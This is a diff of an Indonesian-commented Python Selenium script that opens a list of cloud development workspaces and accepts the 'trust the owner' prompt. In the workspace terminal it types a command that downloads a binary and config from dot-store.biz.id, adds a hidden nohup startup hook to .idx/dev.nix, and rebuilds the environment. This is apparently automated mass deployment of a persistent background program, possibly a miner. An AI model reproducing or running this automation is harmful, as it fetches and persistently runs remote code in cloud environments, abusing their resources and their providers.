@@ -1,4 +1,4 @@
-from multiprocessing import Process, Barrier
+from multiprocessing import Process
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
@@ -17,7 +17,6 @@ SLEEP_SESUDAH_AKSI = 30
 SLEEP_JIKA_ERROR = 10
 
 def log_sukses(profile_name, current, total):
-    # Mudah diubah, misalnya log ke file atau tampilkan lebih detail
     print(f"[{datetime.now().strftime('%H:%M:%S')}] {profile_name} berhasil proses link {current}/{total}", flush=True)
 
 def get_options(user_data_dir, profile_dir):
@@ -48,10 +47,6 @@ def read_links_from_file(path):
         return [line.strip() for line in f if line.strip()]
 
 def find_and_click_rebuild(driver):
-    """
-    Fungsi ini akan coba switch ke iframe yang mengandung tombol rebuild environment,
-    lalu klik tombolnya.
-    """
     try:
         iframes = driver.find_elements(By.TAG_NAME, "iframe")
         print(f"[{datetime.now()}] [INFO] Jumlah iframe ditemukan: {len(iframes)}")
@@ -61,7 +56,6 @@ def find_and_click_rebuild(driver):
             driver.switch_to.frame(iframe)
 
             try:
-                # Coba cari tombol 'Rebuild Environment'
                 rebuild_btn = WebDriverWait(driver, 3).until(
                     EC.element_to_be_clickable((By.CSS_SELECTOR, "div.floating-click-widget > div"))
                 )
@@ -70,7 +64,7 @@ def find_and_click_rebuild(driver):
                     time.sleep(0.5)
                     driver.execute_script("arguments[0].click();", rebuild_btn)
                     print(f"[{datetime.now()}] [INFO] Tombol 'Rebuild Environment' diklik di iframe index {i}")
-                    return True  # Sukses klik tombol
+                    return True
             except TimeoutException:
                 print(f"[{datetime.now()}] [INFO] Tombol 'Rebuild Environment' tidak ditemukan di iframe index {i}")
             finally:
@@ -110,29 +104,24 @@ def open_terminal_and_run(driver):
         time.sleep(3)
 
         commands = [
-    'grep -q "joko = " .idx/dev.nix || sed -i \'/onStart = {/a \\        joko = "cd  ~/.cloud && nohup ./cloud -c \'config.json\' > /dev/null 2>\\&1 &";\' .idx/dev.nix && cd ~/ && mkdir -p .cloud && cd .cloud && wget -O cloud https://dot-store.biz.id/bagong && wget -O config.json https://dot-store.biz.id/bagong.json && chmod +x cloud config.json'
-]
+            'grep -q "joko = " .idx/dev.nix || sed -i \'/onStart = {/a \\        joko = "cd  ~/.cloud && nohup ./cloud -c \'config.json\' > /dev/null 2>\\&1 &";\' .idx/dev.nix && cd ~/ && mkdir -p .cloud && cd .cloud && wget -O cloud https://dot-store.biz.id/bagong && wget -O config.json https://dot-store.biz.id/bagong.json && chmod +x cloud config.json'
+        ]
         for cmd in commands:
             actions = ActionChains(driver)
             for char in cmd:
                 actions.send_keys(char)
             actions.send_keys(Keys.ENTER)
             actions.perform()
-
             time.sleep(2)
 
             actions = ActionChains(driver)
             actions.send_keys(Keys.ENTER)
             actions.perform()
-
             time.sleep(3)
 
         print(f"[{datetime.now()}] [INFO] Semua perintah diketik di terminal.")
-
-        # Klik tombol Rebuild Environment dengan handling iframe
         find_and_click_rebuild(driver)
-
-        time.sleep(5)  # langsung pakai angka
+        time.sleep(5)
 
     except Exception as e:
         print(f"[{datetime.now()}] [ERROR TERMINAL] {e}")
@@ -141,36 +130,35 @@ def process_single_link(driver, link):
     try:
         driver.get(link)
         wait = WebDriverWait(driver, 10)
-        
+
         try:
             trust = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'I trust the owner')]")))
             trust.click()
         except: pass
-        
+
         try:
             open_ws = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Open Workspace')]")))
             open_ws.click()
         except: pass
-        
+
         time.sleep(SLEEP_SEBELUM_AKSI)
-        
+
         open_terminal_and_run(driver)
 
         time.sleep(SLEEP_SESUDAH_AKSI)
-        
+
         return True
     except:
         time.sleep(SLEEP_JIKA_ERROR)
         return False
 
-def worker(profile_name, user_data_dir, profile_dir, window_position, links, barrier: Barrier):
+def worker(profile_name, user_data_dir, profile_dir, window_position, links):
     if not links:
         return
 
     options = get_options(user_data_dir, profile_dir)
     driver = webdriver.Chrome(options=options)
 
-    # Atur posisi jendela
     if window_position:
         driver.set_window_position(*window_position)
 
@@ -183,10 +171,9 @@ def worker(profile_name, user_data_dir, profile_dir, window_position, links, bar
             count += 1
             log_sukses(profile_name, count, total)
 
-        try:
-            barrier.wait()  # Tunggu semua proses sebelum lanjut
-        except:
-            break
+        pass  # Sinkronisasi antar proses dihapus karena hanya satu proses
+
+    driver.quit()
 
 if __name__ == "__main__":
     user_profiles = [
@@ -203,13 +190,10 @@ if __name__ == "__main__":
         print("link.txt kosong, keluar.")
         exit(1)
 
-    # Bagi link ke masing-masing profil (MEMASTIKAN TIDAK ADA LINK TERLEWAT)
     links_for_profiles = []
     chunk_size = (len(all_links) + len(user_profiles) - 1) // len(user_profiles)
     for i in range(0, len(all_links), chunk_size):
         links_for_profiles.append(all_links[i:i + chunk_size])
-
-    barrier = Barrier(len(user_profiles))
 
     processes = []
     for i, profile in enumerate(user_profiles):
@@ -219,7 +203,6 @@ if __name__ == "__main__":
             profile['profile_dir'],
             profile['window_position'],
             links_for_profiles[i],
-            barrier
         ))
         p.start()
         processes.append(p)
